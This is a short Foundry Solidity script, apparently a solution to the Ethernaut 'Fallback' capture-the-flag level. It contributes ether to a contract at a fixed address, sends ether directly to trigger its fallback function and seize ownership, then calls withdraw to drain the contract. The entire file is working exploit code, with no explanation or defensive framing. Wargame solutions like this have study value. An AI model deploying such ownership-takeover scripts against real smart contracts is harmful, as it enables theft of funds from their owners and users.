// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Fallback.sol";

contract Solve is Script {
    // script with 0.001 ether
    function run() external payable {
        vm.startBroadcast();

        Fallback victim = Fallback(payable(0xa91399d836Afbc2054Df39aF605068940891B744));
        victim.contribute{value: 0.0005 ether}();
        (bool success,) = address(victim).call{value: 0.0005 ether}("");
        victim.withdraw();

        vm.stopBroadcast();
    }
}